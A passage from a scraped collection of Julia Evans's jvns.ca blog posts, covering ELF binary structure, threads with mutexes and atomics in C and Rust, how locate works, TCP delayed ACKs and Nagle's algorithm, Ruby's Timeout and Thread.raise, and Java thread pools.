\n\n Step 4: Look at some assembly! \n\n We mentioned briefly that  .text  contains assembly code. We can\nactually look at what it is really easily. If we were magicians, we\nwould already be able to read and understand this: \n\n Contents of section .text:\n 400410 31ed4989 d15e4889 e24883e4 f0505449  1.I..^H..H...PTI\n 400420 c7c0a005 400048c7 c1100540 0048c7c7  ....@.H....@.H..\n 400430 f4044000 e8c7ffff fff49090 4883ec08  ..@.........H...\n \n\n It starts with  31ed4989 . Those are bytes that our CPU interprets as\ncode! And runs! However we are not magicians (I don’t know what  31\ned  means!) and so we will use a disassembler instead. \n\n $ objdump -d ./hello\nDisassembly of section .text:\n\n0000000000400410 <_start>:\n  400410:       31 ed                   xor    %ebp,%ebp\n  400412:       49 89 d1                mov    %rdx,%r9\n  400415:       5e                      pop    %rsi\n  400416:       48 89 e2                mov    %rsp,%rdx\n  400419:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp\n \n\n full output here \n\n So we see that  31 ed  is xoring two things. Neat! That’s all the\nassembly we’ll do for now. \n\n Step 5: Segments! \n\n Finally, a program is organized into  segments  or  program\nheaders . Let’s look at the segments for our program using  readelf\n--segments hello . \n\n Program Headers:\n  [... removed ...]\n  INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238\n                 0x000000000000001c 0x000000000000001c  R      1\n      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]\n  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000\n                 0x00000000000006d4 0x00000000000006d4  R E    200000\n  LOAD           0x0000000000000e28 0x0000000000600e28 0x0000000000600e28\n                 0x00000000000001f8 0x0000000000000208  RW     200000\n  [... removed ...]\n\n Section to Segment mapping:\n  Segment Sections...\n   00     \n   01     .interp \n   02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym\n       .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt\n       .text .fini .rodata .eh_frame_hdr .eh_frame\n   03     .ctors .dtors .jcr .dynamic .got .got.plt .data .bss \n   04     .dynamic \n   05     .note.ABI-tag .note.gnu.build-id \n   06     .eh_frame_hdr \n   07     \n   08     .ctors .dtors .jcr .dynamic .got \n\n \n\n Segments are used to determine how to separate different parts of the\nprogram into memory. The first  LOAD  segment is marked R E (read /\nexecute) and the second is  RW  (read/write).  .text  is in the first\nsegment (we want to read it but never write to it), and  .data ,\n .bss  are in the second (we need to write to them, but not execute\nthem). \n\n Not magic! \n\n Executables aren’t magic. ELF is a file format like any other! You can\nuse  readelf ,  nm , and  objdump  to inspect your Linux binaries. Try\nit out! Have fun. \n\n Other resources: \n\n \n I found\n this introduction to ELF \nhelpful for explaining sections and segments \n There’s a wonderful\n graphic showing the structure of an ELF binary . \n For learning more about how linkers work, there’s a wonderful\n 20 part series about linkers ,\nwhich I wrote about\n here \nand\n here . \n I haven’t talked much about assembly at all here! Read Dan Luu’s\n Editing Binaries: Easier than it sounds \n \n\n  Thanks very much to the amazing\n Allison Kaptur  and\n Dan Luu  for reading a draft of this. \n"},
{"url": "https://jvns.ca/blog/2014/12/14/fun-with-threads/", "title": "Diving into concurrency: trying out mutexes and atomics", "content": "\n      I hadn’t written any threaded programs before yesterday. I knew sort of\nabstractly about some concurrency concepts (mutexes! people say\ncompare-and-swap but I don’t totally get it!), but actually\nunderstanding a Thing is hard if I’ve never done it. So yesterday I\ndecided to write a program with threads! In this post, we’re going to: \n\n \n Write a threaded program that gets the wrong answer because of a race\ncondition \n Fix that race condition in C and Rust, using 2 different approaches\n(mutexes and atomics) \n Find out why Rust is slower than C \n Talk a little about the actual system calls and instructions that\nmake some of this work \n \n\n \n\n At first I was going to write a concurrent hashmap, but\n Kamal  wisely pointed out that I\nshould start with something simpler, like a counter! \n\n So. We’re going to get 20 threads to count to 20,000,000 all together.\nWe’ll have a global counter variable, and increment it like this: \n\n counter += 1\n \n\n That seems so safe! What can go wrong here is that if two threads try to\nincrement the number at the exact same time, then it’ll only get\nincremented once instead of twice. This is called a  race condition . \n\n Writing a race condition \n\n Here’s what my original C program looks like, with the bug. I wrote this\nby knowing that people used a library called “pthreads” to do threads in\nc, and googling “pthreads example”. I’m not going to explain it very\nmuch, but essentially it creates 20 threads and has them all run the\n AddThings  function which increments a global counter a million times. \n\n Full version:\n counter_race.c . \n\n #define NUM_THREADS     20\n#define NUM_INCREMENTS  1000000\n\nint counter;\n\nvoid *AddThings(void *threadid) {\n   for (int i = 0; i < NUM_INCREMENTS; i++)\n        counter += 1;\n   pthread_exit(NULL);\n}\n\nint main (int argc, char *argv[]) {\n   pthread_t threads[NUM_THREADS];\n   long t;\n   for(t = 0; t<NUM_THREADS; t++){\n      int rc = pthread_create(&threads[t], NULL, AddThings, (void *)t);\n      if (rc){\n         printf(\"ERROR; return code from pthread_create() is %d\\n\", rc);\n         exit(1);\n      }\n   }\n   // Wait for threads to finish\n   for (t = 0; t < NUM_THREADS; t++)\n       pthread_join(threads[t], NULL);\n   printf(\"Final value of counter is: %d\\n\", counter);\n   pthread_exit(NULL);\n}\n \n\n This program a) runs very fast and b) returns wildly different answers\neach time. We’re expecting 20,000,000. I ran it 10 times and got 10\ndifferent answers, between 2,838,838 and 5,695,671. \n\n First try: mutexes! (and learning that mutexes can be Really Slow) \n\n A mutex (or  lock ) is a way to control access to a resource so that\ntwo threads don’t change it in conflicting ways at the same time. \n\n A typical pattern for using a lock is: \n\n lock.lock();\n// do something with shared state, eg counter +=1 \nlock.unlock();\n \n\n Mutexes are often implemented on Linux systems with the  futex  system\ncall . Basically it’s\na way of saying “hey, kernel! This lock is closed, so I’d like to stop\nrunning. Can you please wake me up when it’s available again?“. \n\n I learned during these explorations that all this making system calls\nand going to sleep and waking up again is actually pretty expensive. But\nlet’s do performance numbers first! \n\n So the C pthread library has a mutex implementation like this. Let’s\nimplement our counter with it! You can see the full implementation t\n counter_with_mutex.c .\nIt’s a pretty small change: we need to add \n\n pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;\n \n\n at the beginning, and replace  counter += 1  with \n\n pthread_mutex_lock(&mutex);\ncounter += 1;\npthread_mutex_unlock(&mutex);\n \n\n If we run our new program, it calculates the correct answer every time!\nAmazing! What does the performance of this look like? I’m going to do\nall my profiling with  perf stat  (perf is an amazing program that you\ncan read more about in  I can spy on my CPU cycles with perf! ) \n\n $ perf stat ./counter_with_mutex\nFinal value of counter is: 20000000\n       3.134196432 seconds time elapse\n \n\n Our original counter with the race condition took more like 0.08\nseconds. This is a really big performance hit, even if it means that we\nhave a program that works instead of a program that doesn’t! \n\n Mutexes in Rust, too! (it’s even slower!) \n\n I decided to implement the same thing in Rust because, well, Rust is\nfun! You can see it at\n rust_counter_mutex.rs . \n\n We create a mutex with \n\n let data = Arc::new(Mutex::new(0u));\n \n\n and increment it with \n\n for _ in range(0u, NUM_INCREMENTS) {\n   let mut d = data.lock();\n    *d += 1;\n}\n \n\n I basically got this to work by  copying the Rust mutex\ndocumentation . I’m\npretty impressed by how much Rust’s documentation has improved in the\nlast year. \n\n I ran this, and I was expecting it to perform about as well as my C code.\nIt didn’t. \n\n $ perf stat ./rust_counter_mutex\n       8.842611143 seconds time elapsed\n \n\n My first instinct was to profile it! I used Brendan Gregg’s excellent\n flame graph library , and ran \n\n $ sudo perf record ./rust_counter_mutex\n$ sudo perf script | stackcollapse-perf.pl | flamegraph.pl > rust_mutex_flamegraph.svg\n \n\n \n\n \n\n What is even going on here?! These two graphs look exactly the same. Why\ndoes the Rust one taking longer? \n\n So, off to the races in the #rust IRC channel! Fortunately, the people\nin #rust are the Nicest People. You can see them helping me out  in the\nlogs \n=D. \n\n After a while, someone named Sharp explains that Rust’s mutexes are\nimplemented in a Slow Way using channels. This seems to make sense, but\nthen why couldn’t I see that from the flamegraph? He explains helpfully\nthat channels in Rust are also implemented with the  futex  syscall, so\nit’s spending all of its time in the same syscalls, just doing it less\nefficiently. COOL. \n\n Sharp also suggests using an atomic instead of a mutex, so that’s the next\nstep! \n\n Making it fast with atomics in Rust \n\n This one is at\n rust_counter_atomics.rs .\nI did this without actually understanding what an atomic even is, so I’m not\ngoing to explain anything yet. \n\n Basically we replace our mutex with a \n\n let counter = Arc::new(AtomicUint::new(0));\n \n\n and our loop with \n\n for _ in range(0u, NUM_INCREMENTS) {\n    counter.fetch_add(1, Relaxed);\n}\n \n\n I’m not going to talk about the  Relaxed  right now (because I don’t understand it as well as I’d like), but basically this increments our counter in a threadsafe way (so that two threads can’t race). \n\n And it works! And it’s fast! \n\n perf stat ./rust_counter_atomics\n20000000\n       0.556901591 seconds time elapsed\n \n\n Here’s the new flamegraph: \n\n \n\n You can see from the new flamegraph that it’s definitely not using\nmutexes at all. But we still don’t know how these atomics work, which is\ntroubling. Let’s implement the same thing in C, to see if it makes it a\nlittle clearer. \n\n Atomics in C: even faster! \n\n To use atomics in our C program, I replaced \n\n for (int i = 0; i < NUM_INCREMENTS; i++) {\n    pthread_mutex_lock(&mutex);\n    counter += 1;\n    pthread_mutex_unlock(&mutex);\n}\n \n\n with something called  __sync_add_and_fetch : \n\n    for (int i = 0; i < NUM_INCREMENTS; i++) {\n       __sync_add_and_fetch(&counter, 1);\n   }\n \n\n You might have noticed that the  fetch_add  in Rust is suspiciously\nsimilar to  __sync_add_and_fetch . This is a special GCC  atomic builtin \nwhich generates assembly instructions to safely increment our counter. \n\n That GCC documentation page is pretty readable! One interesting thing is\nthis: \n\n \n All of the routines are described in the Intel documentation to take\n“an optional list of variables protected by the memory barrier”. It’s\nnot clear what is meant by that; it could mean that only the following\nvariables are protected, or it could mean that these variables should\nin addition be protected. At present GCC ignores this list and\nprotects all variables which are globally accessible. If in the future\nwe make some use of this list, an empty list will continue to mean all\nglobally accessible variables. \n \n\n It’s sort of refreshing to hear the people who write GCC (who I think of\nas MAGICAL WIZARDS WHO KNOW EVERYTHING) say that they read some Intel\ndocumentation and it was not clear what it meant! This stuff must really\nnot be easy. \n\n This C program is a little faster than the Rust version, clocking in at\naround 0.44 seconds on my machine. I don’t know why. \n\n What actual CPU instructions are involved? \n\n I don’t really read assembly, so we’ll need some help to see which are\nthe Magical Safe Instructions.  perf  is the best program in the\nuniverse, and it can help us with this!  perf record  and  perf\nannotate  together let us see which instructions in our program are\ntaking the most time. \n\n $ perf record ./counter_with_atomics\n$ perf annotate --no-source\n       │    ↓ jmp    21 \n  0.03 │15:   lock   addl   $0x1,counter\n 99.43 │      addl   $0x1,-0x4(%rbp)\n  0.13 │21:   cmpl   $0xf423f,-0x4(%rbp)\n  0.41 │    ↑ jle    15  \n \n\n and we can try it with the Rust program, too: \n\n $ perf record ./rust_counter_atomics\n$ perf annotate --no-source\n       │       nop\n  0.05 │ 50:   mov    0x20(%rbx),%rcx\n  0.02 │       lock   incq 0x10(%rcx)\n 99.93 │       dec    %rax\n       │     ↑ jne    50  \n \n\n So we can see that there’s a  lock  instruction prefix that increments a\nvariable in each case. Googling for “lock instruction finds us this  x86 instruction set reference : \n\n \n In a multiprocessor environment, the LOCK# signal insures that the\nprocessor has exclusive use of any shared memory while the signal is\nasserted. \n \n\n In both cases over 99% of the run time is spent in the instruction right\nafter that instruction. I’m not totally sure why that is, but it could\nbe that the  lock  itself is fast, but then once it’s done the memory it\nupdated needs to be synchronized and the next instruction needs to wait\nfor that to happen. That’s mostly made up though. If you want to explain\nit to me I would be delighted. \n\n (If you’ve heard about compare-and-swap, that’s a similar instruction\nthat lets you update variables without creating races) \n\n We are now slightly closer to being concurrency wizards \n\n This was really fun! In January I was talking to a (super nice!) company\nthat built distributed systems about interviewing there, and they sent\nme some questions to answer. One of the questions was something like\n“can you discuss the pros and cons of using a lock-free approach for\nimplementing a thread-safe hashmap?” \n\n My reaction at the time was WHAT ARE YOU EVEN ASKING ME HELP. But these\nconcurrency explorations make me feel like that question is a lot more\nreasonable! Using atomic instructions in this case was way faster than\nusing a mutex, and I feel like I have a slightly better sense of how all\nthis works now. \n\n Also when I see a process waiting in a  futex(...  system call when I\nstrace it, I understand what’s going on a little better! This is\nwonderful. \n\n Thanks are due to  Kamal  for having\nlots of wonderful suggestions, and the people of the ever-amazing #rust\nIRC channel. You can see all the code for this post at\n https://github.com/jvns/fun-with-threads/ . \n"},
{"url": "https://jvns.ca/blog/2015/03/05/how-the-locate-command-works-and-lets-rewrite-it-in-one-minute/", "title": " How the locate command works (and let's write a faster version in one minute!)", "content": "\n      Sometimes I want to find all the Alanis songs on my computer. There are\n(basically) two ways to do this. \n\n \n find / -name '*Alanis*' \n locate Alanis \n \n\n I’ve known for a long time that  locate  is faster than  find , and that it had\nsome kind of database, and that you could update the database using  updatedb . \n\n But I always somehow thought of the locate database as this Complicated Thing.\nUntil today I started looking at it! On my machine it’s\n /var/lib/mlocate/mlocate.db . You can probably find it with  locate mlocate \nor  strace -e open locate whatever . It’s about 15MB on my computer. \n\n When I  cat  it, here’s what part of it looks like. \n\n /bin^@^@bash^@^@bunzip2^@^@busybox^@^@bzcat^@^@bzcmp^@^@bzdiff^@^@bzegrep^@^@bzexe^@^@bzfgrep^@^@bzgrep^@^@bzip2^@^@bzip2recover^@^@bzless^@^@bzmore^@^@cat^@^@chacl^@^@chgrp^@^@chmod^@^@chown^@^@chvt\n^@^@cp^@^@cpio^@^@dash^@^@date^@^@dbus-cleanup-sockets^@^@dbus-daemon^@^@dbus-uuidgen^@^@dd^@^@df^@^@dir^@^@dmesg^@^@dnsdomainname^@^@domainname^@^@dumpkeys^@^@echo^@^@ed\n^@^@egrep^@^@false^@^@fgconsole^@^@fgrep^@^@findmnt^@^@fuser^@^@fusermount^@^@getfacl^@^@grep^@^@gunzip^@^@gzexe^@^@gzip^@^@hostname^@^@ip^@^@kbd_mode^@^@kill^@^@kmod^@^@\nless^@^@lessecho^@^@lessfile^@^@lesskey^@^@lesspipe^@^@ln^@^@loadkeys^@^@login^@^@loginctl^@^@lowntfs-3g^@^@ls^@^@lsblk^@^@lsmod^@^@mkdir^@^@mknod^@^@mktemp\n \n\n And here’s what’s in the  /bin  directory: \n\n $ ls /bin | head\nbash\nbunzip2\nbusybox\nbzcat\nbzcmp\nbzdiff\nbzegrep\nbzexe\nbzfgrep\nbzgrep\n \n\n COINCIDENCE THAT ALL OF THESE WORDS ARE THE SAME? I THINK NOT! \n\n It turns out that the locate database is basically just a huge recursive\ndirectory listing ( ls -R / ). (I think it’s actually more complicated than\nthat; there’s a paper at the end). So a slightly less space-efficient version\nof this whole  locate  business would be to create a database with this Very\nSophisticated Command: \n\n sudo find / > database.txt\n \n\n This gives us a file that looks like \n\n /\n/vmlinuz.old\n/var\n/var/mail\n/var/spool\n/var/spool/rsyslog\n/var/spool/mail\n/var/spool/cups\n/var/spool/cups/tmp\n/var/spool/cron\n \n\n Then we can more or less reproduce  locate ’s functionality by just doing \n\n grep Alanis database.txt\n\n \n\n I got curious about the relative speed of  find  vs  locate  vs our makeshift\nlocate using  grep . I have an SSD, so a  find  across all files on my computer\nis pretty fast: \n\n $ time find / -name blah\n0.59user 0.67system 0:01.71elapsed 73%CPU\n \n\n $ time locate blah\n0.26user 0.00system 0:00.30elapsed 87%CPU\n \n\n $ time grep blah database.txt\n0.04user 0.02system 0:00.10elapsed 64%CPU\n \n\n Whoa, our homegrown locate using grep is actually way faster! That is\nsurprising to me. Our homegrown database takes about 3x as much space as\n locate ’s database (45MB instead of 15MB), so that’s probably part of why. \n\n Anyway now you know how it works! This kind of makes me wonder if our database\nformat which doesn’t use any clever compression tricks might actually be a\nbetter format if you’re not worried about the extra space it takes up. But I\ndon’t really understand yet why locate is so much slower. \n\n My current theory is that grep is better optimized than locate and that it can\ndo smarter stuff. But if you know the real answer, or if you get different\nresults on your computer, please tell me! \n\n update: omg Mark Dominus tweeted at me within seconds and said he  found exactly the same thing 10 years ago . Maybe this is really a thing! Or, more likely, there’s just stuff I don’t understand yet here. Either way I’d like to know! \n\n further update: Patrick Collison pointed out this amazingly-titled (and short! 3 pages!)\n Finding Files Fast \nfrom 1983 which talks about locate’s design, and also claims that the\n source is pretty readable . \n\n The 1983 paper specifically calls out “Why not simply build a list of static\nfiles and search with grep?“, and says that grepping a list of 20,000 files\ntook 30 seconds (“unacceptable for an oft-used command”), and that their locate\nimplementation gives them better performance. To compare, I have 700,000 files\non my hard disk, and it takes about 0.05 seconds. It seems to me like the\nlocate authors’ original issues are really not a problem anymore, 30 years\nlater. \n\n They’re also pretty worried about saving space in the locate database, which\nalso isn’t really a concern anymore. This really makes me wonder what other\nstandard unix programs make design assumptions that aren’t true in 2015. \n\n"},
{"url": "https://jvns.ca/blog/2015/11/21/why-you-should-understand-a-little-about-tcp/", "title": "Why you should understand (a little) about TCP", "content": "\n     \n\n This isn’t about understanding  everything  about TCP or reading through  TCP/IP Illustrated . It’s about how a little bit of TCP knowledge is essential. Here’s why. \n\n When I was at the  Recurse Center , I wrote a TCP stack in Python ( and wrote about what happens if you write a TCP stack in Python ). This was a fun learning experience, and I thought that was all. \n\n A year later, at work, someone mentioned on Slack “hey I’m publishing messages to NSQ and it’s taking 40ms each time”. I’d already been thinking about this problem on and off for a week, and hadn’t gotten anywhere. \n\n A little background: NSQ is a queue that you send to messages to. The way you publish a message is to make an HTTP request on localhost. It really should not take  40 milliseconds  to send a HTTP request to localhost. Something was terribly wrong. The NSQ daemon wasn’t under high CPU load, it wasn’t using a lot of memory, it didn’t seem to be a garbage collection pause. Help. \n\n Then I remembered an article I’d read a week before called  In search of performance - how we shaved 200ms off every POST request . In that article, they talk about why every one of their POST requests were taking 200 extra milliseconds. That’s.. weird. Here’s the key paragraph from the post \n\n Delayed ACKs & TCP_NODELAY \n\n \n Ruby’s Net::HTTP splits POST requests across two TCP packets - one for the\nheaders, and another for the body. curl, by contrast, combines the two if\nthey’ll fit in a single packet. To make things worse, Net::HTTP doesn’t set\nTCP_NODELAY on the TCP socket it opens, so it waits for acknowledgement of the\nfirst packet before sending the second. This behaviour is a consequence of\nNagle’s algorithm. \n\n Moving to the other end of the connection, HAProxy has to choose how to\nacknowledge those two packets. In version 1.4.18 (the one we were using), it\nopted to use TCP delayed acknowledgement. Delayed acknowledgement interacts\nbadly with Nagle’s algorithm, and causes the request to pause until the server\nreaches its delayed acknowledgement timeout.. \n \n\n Let’s unpack what this paragraph is saying. \n\n \n TCP is an algorithm where you send data in  packets \n Their HTTP library was sending POST requests in 2 small packets \n \n\n Here’s what the rest of the TCP exchange looked like after that: \n\n \n application: hi! Here’s packet 1.  \nHAProxy: <silence, waiting for the second packet> \nHAProxy: <well I’ll ack eventually but nbd> \napplication: <silence> \napplication: <well I’m waiting for an ACK maybe there’s network congestion> \nHAProxy: ok i’m bored. here’s an ack \napplication: great here’s the second packet!!!! \nHAProxy: sweet. we’re done here \n \n\n That period where the application and HAProxy are both passive-aggressively\nwaiting for the other to send information? That’s the extra 200ms. The application is doing it because of Nagle’s algorithm, and HAProxy because of delayed ACKs. \n\n Delayed ACKs happen, as far as I understand, by default on  every  Linux system.\nSo this isn’t an edge case or an anomaly – if you send your data in more than 1\nTCP packet, it can happen to you. \n\n in which we become wizards \n\n So I read this article, and forgot about it. But I was stewing about my extra 40ms, and then I remembered. \n\n And I thought – that can’t be my problem, can it? can it??? And I sent an email to my team saying “I think I might be crazy but this might be a TCP problem”. \n\n So I committed a change turning on  TCP_NODELAY  for our application, and BOOM. \n\n All of the 40ms delays  instantly disappeared . Everything was fixed. I was a wizard. \n\n should we stop using delayed ACKs entirely \n\n A quick sidebar – I just read  this comment on Hacker News  from John Nagle (of Nagle’s algorithm) via  this awesome tweet  by @alicemazzy. \n\n \n The real problem is ACK delays. The 200ms “ACK delay” timer is a bad idea that\nsomeone at Berkeley stuck into BSD around 1985 because they didn’t really\nunderstand the problem. A delayed ACK is a bet that there will be a reply from\nthe application level within 200ms. TCP continues to use delayed ACKs even if\nit’s losing that bet every time. \n \n\n He goes on to comment that ACKs are small and inexpensive, and that the problems\ncaused in practice by delayed ACKs are probably much worse than the problems\nthey solve. \n\n you can’t fix TCP problems without understanding TCP \n\n I used to think that TCP was really low-level and that I did not need to understand it. Which is mostly true! But sometimes in real life you have a bug and that bug is because of something in the TCP algorithm. So it turns out that understanding TCP is important. (as we frequently discuss on this blog, this turns out to be true for a lot of things, like, system calls & operating systems :) :)) \n\n This delayed ACKs / TCP_NODELAY interaction is particularly bad – it could affect anyone writing code that makes HTTP requests, in any programming language. You don’t have to be a systems programming wizard to run into this. Understanding a tiny bit about how TCP worked really helped me work through this and recognize that that thing the blog post was describing also might be my problem. I also used strace, though. strace forever. \n\n"},
{"url": "https://jvns.ca/blog/2015/11/27/why-rubys-timeout-is-dangerous-and-thread-dot-raise-is-terrifying/", "title": "Why Ruby’s Timeout is dangerous (and Thread.raise is terrifying)", "content": "\n     \n\n This is already documented in  Timeout: Ruby’s most dangerous API . And normally I don’t like making blanket statements about language features. But I had a bad day at work because of this issue. So today, we’re talking about Timeout! :) \n\n First! What is Timeout? Let’s say you have a bunch of code, that might be slow. A network request, a long computation, whatever.  Ruby’s  timeout documentation  helpfully says \n\n \n Timeout provides a way to auto-terminate a potentially long-running operation if it hasn’t finished in a fixed amount of time. \n \n\n require 'timeout'\nstatus = Timeout::timeout(5) {\n  # Something that should be interrupted if it takes more than 5 seconds...\n}\n \n\n AWESOME. This is so much easier than wrangling network socket options which might be set deep inside some client library. Seems great! \n\n I tried using Timeout at work last week, and it resulted in an extremely difficult to track down bug. I felt awesome about tracking it down, and upset with myself about creating it in the first place. Let’s talk a little more about this (mis)feature. \n\n Timeout: how it works (and why Thread.raise is terrifying) \n\n Its implementation originally seems kind of clever. You can read  the code here . It starts a new thread, which sets the original thread to  x , sleeps for 5 seconds, then raises an exception on the main thread when it’s done, interrupting whatever it was doing. \n\n begin\n  sleep sec\nrescue => e\n  x.raise e\nelse\n  x.raise exception, message\nend\n \n\n Let’s look at the documentation on  Thread.raise . It says: \n\n \n Raises an exception (see Kernel::raise) from thr. The caller does not have to be thr. \n \n\n This is where the implications get interesting, and terrifying. This means that an exception can get raised: \n\n \n during a network request (ok, as long as the surrounding code is prepared to catch  Timeout::Error ) \n during the cleanup for the network request \n during a  rescue  block \n while creating an object to save to the database afterwards \n in  any  of your code, regardless of whether it could have possibly raised an exception before \n \n\n Nobody writes code to defend against an exception being raised  on literally any line . That’s not even possible. So  Thread.raise  is basically like a sneak attack on your code that could result in almost anything. It would probably be okay if it were pure-functional code that did not modify any state. But this is Ruby, so that’s unlikely :) \n\n Timeout uses Thread.raise, so it is not safe to use. \n\n Other languages and Thread.raise \n\n So, how do other languages approach this? Go doesn’t have exceptions, Javascript doesn’t have threads – let’s talk about Python, Java, and C#, and C++. \n\n Java  has  java.lang.Thread.stop , which does essentially the same thing. It was deprecated in Java 1.2, in 1998, disabled entirely in Java 8, and its documentation reads: \n\n \n Deprecated.  This method is inherently unsafe. See stop() for details. An additional danger of this method is that it may be used to generate exceptions that the target thread is unprepared to handle (including checked exceptions that the thread could not possibly throw, were it not for this method). For more information, see  Why are Thread.stop, Thread.suspend and Thread.resume Deprecated?. \n \n\n Python  has  thread.interrupt_main() , which does the same thing as Ctrl+C-ing a program from your terminal. I’m not really sure what to say about this – certainly using  thread.interrupt_main()  also isn’t really a good idea, and it’s more limited in what it can do. I can’t find any reference to anybody considering using it for anything serious. \n\n C#  has  Thread.Abort()  which throws a  ThreadAbortException  in the thread. Googling it finds me a series of  StackOverflow discussions  & forum posts about how it’s dangerous and should not be used, for the reasons we’ve learned about. \n\n C++ :  std::thread s  are not interruptible . \n\n Not just an implementation issue \n\n This is not just an implementation issue in Ruby, and you can read  a great comment on Reddit illustrating this . The whole premise of a general timeout method that will interrupt an arbitrary block of code like this is flawed. Here’s the API again: \n\n require 'timeout'\nstatus = Timeout::timeout(5) {\n  # Something that should be interrupted if it takes more than 5 seconds...\n}\n \n\n There is no way to safely interrupt an arbitrary block of code.  Anything  could be happening at the end of that 5 seconds. \n\n However! All is not lost if we would like to interrupt our threads. Let’s turn to Java again! (you know all the times we say Ruby is more fun than Java? TODAY JAVA IS MORE FUN BECAUSE IT MAKES MORE SENSE.) Java has a  Thread.interrupt  method, which sends  InterruptedException  to a thread. But an InterruptedException is only allowed to be thrown at specific times, for instance during  Thread.sleep . Otherwise the thread needs to explicitly call  Thread.interrupted()  to see if it’s supposed to stop. \n\n On documentation \n\n I don’t know. It’s possible that everybody knew that  Timeout  was a disaster except for me, and that I should have thought more carefully about what the implications of this  Thread.raise  were. But I’m thinking of making a pull request on the Ruby documentation with slightly stronger language than \n\n \n Timeout provides a way to auto-terminate a potentially long-running operation if it hasn’t finished in a fixed amount of time. \n \n\n and \n\n \n Raises an exception (see Kernel::raise) from thr. The caller does not have to be thr. \n \n\n The Java approach (where they deprecated it with a strong warning and then disabled the method entirely) seems more like the right thing. \n\n"},
{"url": "https://jvns.ca/blog/2016/03/27/thread-pools-how-do-i-use-them/", "title": "Thread pools! How do I use them?", "content": "\n     \n\n HELLO! Today we’re going to talk about THREAD POOLS and PARALLELIZING COMPUTATION. I learned a couple of things about this over the last few days. This is mostly going to be about Java & the JVM. It turns out that there are lots of things to know about concurrency on the JVM, but luckily, lots of people know those things so you can learn them! \n\n A thread pool lets you run computations in more than one thread at the same time. Let’s say I have a Super Slow Function, and I want to run it on 10000 things, and I have 32 cores on my CPU. Then I can run my function 32 times faster! Here’s what that looks like in Python. \n\n from multiprocessing.pool import ThreadPool\n\ndef slow_function():\n    do_whatever\nresults = ThreadPool(32).map(slow_command, list_of_things)\n \n\n This seems really simple, right? Well, I was trying to parallelize something in Java (Scala, really) the other day and it was not this simple at all. So I wanted to tell you some of the confusing things I ran into. \n\n My task: run a Sort Of Slow Function on 60 million things. It was already parallelized, but it was only using maybe 8 of my 32 CPU cores. I wanted it to use ALL OF THEM. This task was trivially parallelizable so I thought it would be easy. \n\n blocked threads \n\n One of the first things I started seeing when I looked at my program with YourKit (a super great profiler for the JVM) was something a little like this (taken from  here ): \n\n \n\n What was this red stuff?! My threads were “blocked”. What is a blocked thread? \n\n In Java, a thread is “blocked” when it’s waiting for a “monitor” on an object. When I originally googled this I was like “er what’s a monitor?”. It’s when you use synchronization to make sure two different threads don’t execute the same code at the same time. \n\n // scala pseudocode\nclass Blah {\n    var x = 1\n    def plus_one() {\n        this.synchronized {\n            x += 1\n        }\n    }\n}\n \n\n This  synchronize  means that only one thread is allowed to run this  x += 1  block at a time, so you don’t accidentally end up in a race. If one thread is already doing  x += 1 , the other threads end up – you guessed it – BLOCKED. \n\n The two things that were blocking my threads were: \n\n \n lazy  vals in Scala used  synchronized  internally, and so can cause problems with concurrency \n Double.parseDouble  in Java 7 is a synchronized method. So only one thread can parse doubles from strings at a time. Really? Really. They fixed it in Java 8 though so that’s good. \n \n\n waiting threads \n\n So, I unblocked some of my threads. I thought I was winning. This was only sort of true. Now a lot of my threads were orange. Orange means that the threads are like “heyyyyyyy I’m ready but I have nothing to do”. \n\n At this point my code was like: \n\n def doStuff(pool: FuturePool) {\n    // a FuturePool is a thread pool\n    while not done {\n        var lines = read_from_disk\n        var parsedStuff = parse(lines)\n        pool.submit(parsedSuff.map{expensiveFunction})\n    }\n}\n \n\n This was a pretty good function. I was submitting work to the pool! Work was getting done! In parallel! \n\n But my main thread was doing all the work of submitting. And you see that  parse(lines) ? Sometimes this happened: \n\n main: here is work to do!\nmain: start parsing\nthread pool: ok I'm ready for more\nmain: I'M STILL PARSING OK\nmain: ok here is more work\n \n\n The main thread couldn’t submit more work to the thread pool because it was too busy parsing! \n\n This is like if you get a 5 year old to mix the batter for the cake when you’re doing a Complicated Kitchen Thing and they’re like OK OK OK OK OK OK WHAT NEXT and you’re like JUST A MINUTE. \n\n The obvious solution to here was to give the parsing work to the threads! Because threads are not 5 year olds and they can do everything the main thread can do. So I rewrote my function be more like this: \n\n def doStuff(pool: FuturePool):\n    // a FuturePool is a thread pool\n    // make sure it only has 32 threads so it\n    // does not spin up a bajillion threads\n    while not done {\n        var lines = read_from_disk\n        pool.submit(parsedSuff.map{parse}.map{expensiveFunction})\n    }\n \n\n AWESOME. This was great, right? \n\n Wrong. Then this happened:  OutOfMemoryError . What. Why. This brings us to… \n\n Work queues \n\n This  FuturePool  abstraction is cool. Just give the thread work and it’ll do it! Don’t worry about what’s underneath! But now we need to understand what’s underneath. \n\n In Java, you normally handle thread pools with something called an  ExecutorService . This keeps a thread pool (say 32 threads). Or it can be unbounded! In this case I wanted to only have as many threads as I have CPU cores, ish. \n\n So let’s say I run  ExecutorService.submit(work)  32 times, and there are only 32 threads. What happens the 33rd time? Well,  ExecutorService  keeps an internal queue of work to do. So it holds on to Thing 33 and does something like \n\n loop {\n    if(has_available_thread) {\n        available_thread.submit(queue.pop())\n    }\n}\n \n\n In my case, I was reading a bunch of data off disk. maybe 10GB of data. And I was submitting  all of that data  into the ExecutorService work queue. Unsurprisingly, the queue exploded and crashed my program. \n\n I tried to fix this by changing the internal queue in ExecutorService to an  ArrayBlockingQueue  with size 100, so that it would not accept an unlimited amount of work. Awesome! \n\n still not done \n\n I spend like.. 8 hours on this? more? I was trying to do a small thing at work but I ended up working on it at like midnight because it was supposed to be a minor task and I couldn’t really justify spending more work time on it. I am still confused about how to do this thing that I thought would be easy. \n\n I think what I need to do is: \n\n \n read from disk \n submit work to the ExecutorService. But with a bounded queue!! \n catch the exception from ExecutorService when it fails to schedule work, wait, and try again \n etc etc \n \n\n Or maybe there is a totally simple way and this could take me 5 minutes! \n\n This kind of thing makes me feel dumb, but in a really good and awesome way. I now know a bunch of things I didn’t know before about Java concurrency!! I used to feel bad when I realized I didn’t know how to work with stuff like this. (“threads and work queues are not that advanced of a concept julia what if you are an awful programmer”). \n\n Now I don’t really feel bad usually I’m just like WELL TODAY IS THE DAY WHEN I LEARN IT. And tomorrow I will be even more 